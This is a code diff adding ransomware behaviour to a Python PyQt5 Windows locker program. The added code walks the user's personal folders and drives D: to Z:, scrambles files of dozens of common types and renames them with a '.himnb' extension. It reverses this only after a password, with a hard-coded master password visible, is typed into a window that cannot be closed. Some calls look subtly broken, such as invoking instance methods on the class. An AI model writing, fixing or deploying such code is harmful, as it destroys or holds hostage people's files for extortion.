@@ -1,12 +1,11 @@
 from PyQt5 import QtCore, QtGui, QtWidgets
-from PyQt5.QtGui import QIcon
 import sys
 import os
 import uuid
 import ctypes
 import winreg
 
-
+use=os.getlogin()
 
 encryption_table = {
     '0': 'a', '1': 'q', '2': 'e', '3': 'c', '4': 'j',
@@ -72,9 +71,23 @@ if sys.argv[0] != filepath:
         with open(filepath , 'wb') as f1:
             f1.write(data)
     killtask(1)
+
+
+def disks():
+    part = []
+
+    for drive in range(ord('D'), ord('Z') + 1):
+        drive = chr(drive) + ':\\'
+        if os.path.exists(drive):
+            part.append(drive)
+
     
+    return part
+ 
 
-
+folder=[f'C:\\Users\\{use}\\Desktop',f'C:\\Users\\{use}\\Videos',f'C:\\Users\\{use}\\Pictures',
+        f'C:\\Users\\{use}\\Documents',f'C:\\Users\\{use}\\Downloads',f'C:\\Users\\{use}\\Music',
+        f'C:\\Users\\{use}\\3D Objects'] +disks()
 
 
 class cip:
@@ -85,8 +98,11 @@ class cip:
         with open(self.file, 'rb') as files:
             packed = ''.join(str(il*3) + '✌☺' for il in list(files.read()))
             endspack = packed.strip('✌☺')
-            with open(self.file, 'wb') as file:
-                file.write(endspack.encode('utf-8'))
+            try:
+                with open(self.file, 'wb') as file:
+                    file.write(endspack.encode('utf-8'))
+            except:
+                pass
                 
     def jiemi(self):
         with open(self.file, 'rb') as file:
@@ -104,6 +120,64 @@ class cip:
             with open(self.file, 'wb') as file_write:
                 file_write.write(bytes(original_data))
 
+class listfile:
+    
+    @staticmethod    
+    def enfile():
+        extensions = ['.class','.java','.html','.htm','.bmp','.avi','.c','.mp3','.pdf','.doc,','.docx','.xls','.xlsx','.7z',
+                '.ppt','.pptx','.jpg','.png','.py','.gif','.mp4','.avi','.mkv','.wav','.zip','.rar','.jar','.db','.tar',
+                '.sql','.mdb','.bak','.old','.txt','.cpp','.js','.txt','.h','.cs','.bin','.webp','.mov','.wmv','.rtf',
+                '.gz','.odt','.e','.log','.ogg','.php','.go','.rs','.xml','.json','.yml','.css','.dll','.1cd','.ghost',
+                '.vmx','.vmem','.vmdk','.apk','.obj','.pyd','.pyc','.bat','.csv','.swf','.flv','.ai','.psd','.wma','.aac',
+                 '.tif','.data','.jfif','.rdp']  
+        result = []
+        for root, dirs, files in os.walk(os.getcwd()):
+            for file in files:
+                paths = os.path.join(root, file)
+                
+                if os.path.islink(paths):
+                    continue
+
+                _, ext = os.path.splitext(paths)
+                if ext.lower() in extensions:
+                    result.append(paths)
+        
+        return result
+
+    @staticmethod
+    def defile():
+        matching = []
+
+        for dirpath, _, filenames in os.walk(os.getcwd()):
+            for filename in filenames:
+                full_path = os.path.join(dirpath, filename)
+                if filename.endswith(".himnb") and not os.path.islink(full_path):
+                    matching.append(full_path)
+
+        return matching
+
+
+
+for f1 in folder:
+    try:
+        os.chdir(f1)
+        for f2 in listfile.enfile():
+            fnames = cip(f2)
+            cip.jiami()
+            os.rename(f2,f2+'.himnb')
+    except:
+        pass
+
+def dejiami():
+    for f6 in folder:
+        try:
+            os.chdir(f6)
+            for f7 in listfile.defile():
+                fnames = cip(f7)
+                cip.jiemi()
+                os.rename(f7,f7.strip('.himnb'))
+        except:
+            pass
 
 
             
@@ -182,8 +256,9 @@ class Ui_Form():
         global linekey
         linekey = self.lineEdit.text()
         if linekey == pswd or linekey == 'himzuishuaihim4588':
+            ctypes.windll.user32.MessageBoxW(0, '密码正确', "喜报")
             killtask(0)
-                
+            dejiami()
             sys.exit()
             
         else:
@@ -199,10 +274,10 @@ class FormWidget(QtWidgets.QWidget):
     def closeEvent(self, event):
         event.ignore()  
 
-if __name__ == '__main__':
+
     
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, r'C:\Users\{0}\AppData\Roaming\him.png'.format(os.getlogin()), 3)
-    app = QtWidgets.QApplication(sys.argv)
-    widget = FormWidget()
-    widget.show()
-    sys.exit(app.exec_())
+ctypes.windll.user32.SystemParametersInfoW(20, 0, r'C:\Users\{0}\AppData\Roaming\him.png'.format(os.getlogin()), 3)
+app = QtWidgets.QApplication(sys.argv)
+widget = FormWidget()
+widget.show()
+sys.exit(app.exec_())
